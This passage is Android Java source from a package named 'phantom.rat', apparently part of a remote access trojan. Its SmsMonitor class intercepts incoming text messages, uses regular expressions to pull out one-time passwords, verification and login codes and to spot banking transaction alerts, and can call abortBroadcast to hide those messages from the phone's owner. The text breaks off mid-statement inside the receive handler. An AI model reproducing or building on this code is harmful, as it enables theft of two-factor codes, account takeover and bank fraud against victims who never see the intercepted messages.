package com.phantom.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsMonitor extends BroadcastReceiver {
    private static volatile boolean block = false;
    private static final Pattern OTP_KEY = Pattern.compile(
            "(?i)(otp|one[- ]?time|verification|passcode|security code|login code|verify|pin)\\b[^\\d]{0,20}(\\d{4,8})");
    private static final Pattern TX_KEY = Pattern.compile(
            "(?i)(credited|debited|transfer|payment|purchase|withdraw|deposit|balance|spent)");

    public static void setBlock(boolean b) { block = b; }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
        if (block) {
            try { abortBroadcast(); } catch (Exception ignored) {}
        }
        try {
            for (android.telephony.SmsMessage sms : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String body = sms == null ? null : sms.getMessageBody();
                String from = sms == null ? null : sms.getOriginatingAddress();
                if (body == null) continue;
                checkOtp(context, from == null ? "sms"
